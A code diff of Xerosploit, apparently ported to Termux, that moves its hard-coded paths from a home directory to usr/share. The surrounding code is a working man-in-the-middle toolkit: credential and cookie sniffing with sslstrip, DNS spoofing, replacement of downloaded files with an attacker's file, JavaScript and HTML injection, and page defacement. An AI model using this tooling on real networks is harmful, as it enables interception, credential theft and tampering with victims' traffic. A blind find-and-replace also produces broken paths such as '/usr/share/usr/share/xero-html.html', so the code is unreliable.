@@ -41,14 +41,14 @@ def main():
 #Configure the network interface and gateway. 
 		def config0():
 			global up_interface
-			up_interface = open('/data/data/com.termux/files/home/xerosploit/tools/files/iface.txt', 'r').read()
+			up_interface = open('/data/data/com.termux/files/usr/share/xerosploit/tools/files/iface.txt', 'r').read()
 			up_interface = up_interface.replace("\n","")
 			if up_interface == "0":
 				up_interface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
 				up_interface = up_interface.replace("\n","")
 
 			global gateway
-			gateway = open('/data/data/com.termux/files/home/xerosploit/tools/files/gateway.txt', 'r').read()
+			gateway = open('/data/data/com.termux/files/usr/share/xerosploit/tools/files/gateway.txt', 'r').read()
 			gateway = gateway.replace("\n","")
 			if gateway == "0":
 				gateway = os.popen("ip route get 8.8.8.8 | tr ' ' '\n' | sed -n '3p'").read()
@@ -106,15 +106,15 @@ def main():
 
 			scan = os.popen("nmap " + gateway + "/24 -n -sP ").read()
 
-			f = open('/data/data/com.termux/files/home/xerosploit/tools/log/scan.txt','w')
+			f = open('/data/data/com.termux/files/usr/share/xerosploit/tools/log/scan.txt','w')
 			f.write(scan)
 			f.close()
 
-			devices = os.popen(" grep report /data/data/com.termux/files/home/xerosploit/tools/log/scan.txt | awk '{print $5}'").read()
+			devices = os.popen(" grep report /data/data/com.termux/files/usr/share/xerosploit/tools/log/scan.txt | awk '{print $5}'").read()
 
-			devices_mac = os.popen("grep MAC /data/data/com.termux/files/home/xerosploit/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address
+			devices_mac = os.popen("grep MAC /data/data/com.termux/files/usr/share/xerosploit/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address
 
-			devices_name = os.popen("grep MAC /data/data/com.termux/files/home/xerosploit/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"
+			devices_name = os.popen("grep MAC /data/data/com.termux/files/usr/share/xerosploit/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"
 
 			
 			table_data = [
@@ -190,20 +190,20 @@ def main():
 								print("\033[1;34m\n[++] Please wait ... Scanning ports on " + target_name + " \033[1;m")
 								scan_port = os.popen("nmap "+ target_ips + " -Pn" ).read()
 
-								save_pscan = open('/data/data/com.termux/files/home/xerosploit/tools/log/pscan.txt','w') # Save scanned ports result.
+								save_pscan = open('/data/data/com.termux/files/usr/share/xerosploit/tools/log/pscan.txt','w') # Save scanned ports result.
 								save_pscan.write(scan_port)
 								save_pscan.close()
 
 								# Grep port scan information
-								ports = os.popen("grep open /data/data/com.termux/files/home/xerosploit/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
-								ports_services = os.popen("grep open /data/data/com.termux/files/home/xerosploit/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
-								ports_state = os.popen("grep open /data/data/com.termux/files/home/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state
+								ports = os.popen("grep open /data/data/com.termux/files/usr/share/xerosploit/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
+								ports_services = os.popen("grep open /data/data/com.termux/files/usr/share/xerosploit/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
+								ports_state = os.popen("grep open /data/data/com.termux/files/usr/share/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state
 
 
 
 								# Show the result of port scan
 
-								check_open_port = os.popen("grep SERVICE /data/data/com.termux/files/home/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
+								check_open_port = os.popen("grep SERVICE /data/data/com.termux/files/usr/share/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
 								if check_open_port == "STATE\n": 
 
 									table_data = [
@@ -295,14 +295,14 @@ def main():
 							elif action_ping == "run":
 								print("\033[1;34m\n[++] PING " + target_ips + " (" + target_ips + ") 56(84) bytes of data ... \n\033[1;m")
 								ping_cmd = os.popen("ping -c 5 " + target_ips).read()
-								fping = open('/data/data/com.termux/files/home/xerosploit/tools/log/ping.txt','w') #Save ping result , then grep some informations.
+								fping = open('/data/data/com.termux/files/usr/share/xerosploit/tools/log/ping.txt','w') #Save ping result , then grep some informations.
 								fping.write(ping_cmd)
 								fping.close()
 
-								ping_transmited = os.popen("grep packets /data/data/com.termux/files/home/xerosploit/tools/log/ping.txt | awk '{print $1}'").read()
-								ping_receive = os.popen("grep packets /data/data/com.termux/files/home/xerosploit/tools/log/ping.txt | awk '{print $4}'").read()
-								ping_lost = os.popen("grep packets /data/data/com.termux/files/home/xerosploit/tools/log/ping.txt | awk '{print $6}'").read()
-								ping_time = os.popen("grep packets /data/data/com.termux/files/home/xerosploit/tools/log/ping.txt | awk '{print $10}'").read()
+								ping_transmited = os.popen("grep packets /data/data/com.termux/files/usr/share/xerosploit/tools/log/ping.txt | awk '{print $1}'").read()
+								ping_receive = os.popen("grep packets /data/data/com.termux/files/usr/share/xerosploit/tools/log/ping.txt | awk '{print $4}'").read()
+								ping_lost = os.popen("grep packets /data/data/com.termux/files/usr/share/xerosploit/tools/log/ping.txt | awk '{print $6}'").read()
+								ping_time = os.popen("grep packets /data/data/com.termux/files/usr/share/xerosploit/tools/log/ping.txt | awk '{print $10}'").read()
 
 								table_data = [
 				    				['Transmitted', 'Received', 'Loss','Time'],
@@ -348,8 +348,8 @@ def main():
 									html_file = html_file.replace("'","")
 									print("\033[1;34m\n[++] Injecting Html code ... \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-									cmd_code = os.system("cp " + html_file + " /data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/tmp/file.html")
-									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/data/data/com.termux/files/home/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )
+									cmd_code = os.system("cp " + html_file + " /data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/tmp/file.html")
+									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )
 
 									inject_html()
 
@@ -377,7 +377,7 @@ def main():
 							elif action_rdownload == "home":
 								home()
 							elif action_rdownload == "run":
-								module = "/data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/http/replace_file.rb"
+								module = "/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/http/replace_file.rb"
 								print("\033[1;32m\n[+] Specify the extension of the files to replace. (e.g. exe)\n\033[1;m")
 								ext_rdownload = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip()
 								print("\033[1;32m\n[+] Set the file to use in order to replace the ones matching the extension.\n\033[1;m")
@@ -393,7 +393,7 @@ def main():
 								
 									print("\033[1;34m\n[++] All ." + ext_rdownload + " files will be replaced by " + file_rdownload + "  \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
+									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
 									rdownload()						
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -423,7 +423,7 @@ def main():
 									print("\033[1;32m\n[+] Do you want to load sslstrip ? (y/n).\n\033[1;m")
 									action_snif_sslstrip = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
 									if action_snif_sslstrip == "y":
-										print("\033[1;34m\n[++] All logs are saved on : /data/data/com.termux/files/home/xerosploit/xerosniff \033[1;m")
+										print("\033[1;34m\n[++] All logs are saved on : /data/data/com.termux/files/usr/share/xerosploit/xerosniff \033[1;m")
 										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
 										print("\033[1;34m\n[++] sslstrip : \033[1;32mON\033[0m \033[1;m")
 										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
@@ -431,14 +431,14 @@ def main():
 										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
 										filename = target_ips + date
 										filename = filename.replace("\n","")
-										make_file = os.system("mkdir -p /data/data/com.termux/files/home/xerosploit/xerosniff && cd /data/data/com.termux/files/home/xerosploit/xerosniff && touch " + filename + ".log")
-										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /data/data/com.termux/files/home/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
-										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /data/data/com.termux/files/home/xerosploit/xerosniff/" + filename + ".log --sniffer-output /data/data/com.termux/files/home/xerosploit/xerosniff/" + filename + ".pcap")
+										make_file = os.system("mkdir -p /data/data/com.termux/files/usr/share/xerosploit/xerosniff && cd /data/data/com.termux/files/usr/share/xerosploit/xerosniff && touch " + filename + ".log")
+										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /data/data/com.termux/files/usr/share/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
+										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /data/data/com.termux/files/usr/share/xerosploit/xerosniff/" + filename + ".log --sniffer-output /data/data/com.termux/files/usr/share/xerosploit/xerosniff/" + filename + ".pcap")
 										def snifflog():
 											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
 											action_log = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
 											if action_log == "n":
-												cmd_log = os.system("rm /data/data/com.termux/files/home/xerosploit/xerosniff/" + filename + ".*")
+												cmd_log = os.system("rm /data/data/com.termux/files/usr/share/xerosploit/xerosniff/" + filename + ".*")
 												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
 												sleep(1)
 												snif()
@@ -458,7 +458,7 @@ def main():
 										snifflog()
 
 									elif action_snif_sslstrip == "n":
-										print("\033[1;34m\n[++] All logs are saved on : /data/data/com.termux/files/home/xerosploit/xerosniff \033[1;m")
+										print("\033[1;34m\n[++] All logs are saved on : /data/data/com.termux/files/usr/share/xerosploit/xerosniff \033[1;m")
 										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
 										print("\033[1;34m\n[++] sslstrip : \033[1;91mOFF\033[0m \033[1;m")
 										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
@@ -466,16 +466,16 @@ def main():
 										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
 										filename = target_ips + date
 										filename = filename.replace("\n","")
-										make_file = os.system("mkdir -p /data/data/com.termux/files/home/xerosploit/xerosniff && cd /data/data/com.termux/files/home/xerosploit/xerosniff && touch " + filename + ".log")
-										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /data/data/com.termux/files/home/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
-										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /data/data/com.termux/files/home/xerosploit/xerosniff/" + filename + ".log --sniffer-output /data/data/com.termux/files/home/xerosploit/xerosniff/" + filename + ".pcap")
+										make_file = os.system("mkdir -p /data/data/com.termux/files/usr/share/xerosploit/xerosniff && cd /data/data/com.termux/files/usr/share/xerosploit/xerosniff && touch " + filename + ".log")
+										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /data/data/com.termux/files/usr/share/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
+										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /data/data/com.termux/files/usr/share/xerosploit/xerosniff/" + filename + ".log --sniffer-output /data/data/com.termux/files/usr/share/xerosploit/xerosniff/" + filename + ".pcap")
 
 										
 										def snifflog():
 											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
 											action_log = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
 											if action_log == "n":
-												cmd_log = os.system("rm /data/data/com.termux/files/home/xerosploit/xerosniff/" + filename + ".*")
+												cmd_log = os.system("rm /data/data/com.termux/files/usr/share/xerosploit/xerosniff/" + filename + ".*")
 												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
 												sleep(1)
 												snif()
@@ -533,14 +533,14 @@ def main():
 								print("\033[1;32m\n[+] Enter the IP address where you want to redirect the traffic.\n\033[1;m")
 								action_dspoof_ip = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
 								dns_conf = action_dspoof_ip + " .*\.*"
-								outdns = open('/data/data/com.termux/files/home/xerosploit/tools/files/dns.conf','w')
+								outdns = open('/data/data/com.termux/files/usr/share/xerosploit/tools/files/dns.conf','w')
 								outdns.write(dns_conf)
 								outdns.close()
 
 								print("\033[1;34m\n[++] Redirecting all the traffic to " + action_dspoof_ip + " ... \033[1;m")
 								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 
-								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /data/data/com.termux/files/home/xerosploit/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
+								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /data/data/com.termux/files/usr/share/xerosploit/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
 								dspoof()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -577,12 +577,12 @@ def main():
 									home()
 								else:
 									code = "<head> <iframe width='0' height='0' src='http://www.youtube.com/embed/" + video_id + "?autoplay=1' frameborder='0' allowfullscreen></iframe>"
-									code_yplay = open('/data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/tmp/yplay.txt','w')
+									code_yplay = open('/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/tmp/yplay.txt','w')
 									code_yplay.write(code)
 									code_yplay.close()
 									print("\033[1;34m\n[++] PLaying : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
+									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
 									yplay()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -608,7 +608,7 @@ def main():
 							elif action_replace == "home":
 								home()
 							elif action_replace == "run":
-								print("\033[1;32m\n[+] Insert your image path. (e.g. /home/capitansalami/pictures/fun.png)\n\033[1;m")
+								print("\033[1;32m\n[+] Insert your image path. (e.g. /usr/share/capitansalami/pictures/fun.png)\n\033[1;m")
 								img_replace = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m")
 								img_replace = img_replace.replace("'","")
 								if img_replace == "back":
@@ -620,12 +620,12 @@ def main():
 								else:
 									from PIL import Image
 									img = Image.open(img_replace)
-									img.save('/data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/tmp/ximage.png')
+									img.save('/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/tmp/ximage.png')
 									print("\033[1;34m\n[++] All images will be replaced by " + img_replace + "\033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 									
 
-									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)
+									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)
 
 									replace()
 							else:
@@ -654,11 +654,11 @@ def main():
 								home()
 							elif action_driftnet == "run":
 								print("\033[1;34m\n[++] Capturing requested images on " + target_name + " ... \033[1;m")
-								print("\033[1;34m\n[++] All captured images will be temporarily saved in /data/data/com.termux/files/home/xerosploit/xedriftnet \033[1;m")
+								print("\033[1;34m\n[++] All captured images will be temporarily saved in /data/data/com.termux/files/usr/share/xerosploit/xedriftnet \033[1;m")
 								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-								cmd_driftnet = os.system("mkdir -p /data/data/com.termux/files/home/xerosploit/xedriftnet && driftnet -d /data/data/com.termux/files/home/xerosploit/xedriftnet > /dev/null 2>&1 &")
+								cmd_driftnet = os.system("mkdir -p /data/data/com.termux/files/usr/share/xerosploit/xedriftnet && driftnet -d /data/data/com.termux/files/usr/share/xerosploit/xedriftnet > /dev/null 2>&1 &")
 								cmd_driftnet_sniff = os.system("xettercap  -X")
-								cmd_driftnet_2 = os.system("rm -R /data/data/com.termux/files/home/xerosploit/xedriftnet")
+								cmd_driftnet_2 = os.system("rm -R /data/data/com.termux/files/usr/share/xerosploit/xedriftnet")
 								driftnet()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -685,7 +685,7 @@ def main():
 							elif action_shakescreen == "run":
 								print("\033[1;34m\n[++] Injecting shakescreen.js  ... \033[1;m")
 								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
-								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
+								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
 								shakescreen()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -771,11 +771,11 @@ def main():
 
 									
 									content = """<script type='text/javascript'> window.onload=function(){document.body.innerHTML = " """ + file_deface + """ ";}</script>"""
-									f1 = open('/home/home/xero-html.html','w')
+									f1 = open('/usr/share/usr/share/xero-html.html','w')
 									f1.write(content)
 									f1.close()
 
-									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/data/data/com.termux/files/home/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
+									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /usr/share/usr/share/xero-html.html -I " + up_interface + " --gateway " + gateway )
 									deface()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
@@ -889,7 +889,7 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 							home()
 						else:
 
-							s_gateway = open('/data/data/com.termux/files/home/xerosploit/tools/files/gateway.txt','w')
+							s_gateway = open('/data/data/com.termux/files/usr/share/xerosploit/tools/files/gateway.txt','w')
 							s_gateway.write(n_gateway)
 							s_gateway.close()
 
@@ -915,7 +915,7 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 						elif n_up_interface == "home":
 							home()
 						else:
-							s_up_interface = open('/data/data/com.termux/files/home/xerosploit/tools/files/iface.txt','w')
+							s_up_interface = open('/data/data/com.termux/files/usr/share/xerosploit/tools/files/iface.txt','w')
 							s_up_interface.write(n_up_interface)
 							s_up_interface.close()
 
@@ -932,7 +932,7 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 						print("\033[1;32m\n[+] Do want to remove all xerosploit logs ? (y/n)\n\033[1;m")
 						cmd_rmlog = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
 						if cmd_rmlog == "y":
-							rmlog = os.system("rm -f -R /data/data/com.termux/files/home/xerosploit/xerosniff/ /data/data/com.termux/files/home/xerosploit/tools/log/* /data/data/com.termux/files/home/xerosploit/tools/bettercap/modules/tmp/* /data/data/com.termux/files/home/xerosploit/tools/files/dns.conf")
+							rmlog = os.system("rm -f -R /data/data/com.termux/files/usr/share/xerosploit/xerosniff/ /data/data/com.termux/files/usr/share/xerosploit/tools/log/* /data/data/com.termux/files/usr/share/xerosploit/tools/bettercap/modules/tmp/* /data/data/com.termux/files/usr/share/xerosploit/tools/files/dns.conf")
 							print("\033[1;31m\n[++] All logs have been removed. \n\033[1;m")
 							sleep(1)
 							home()
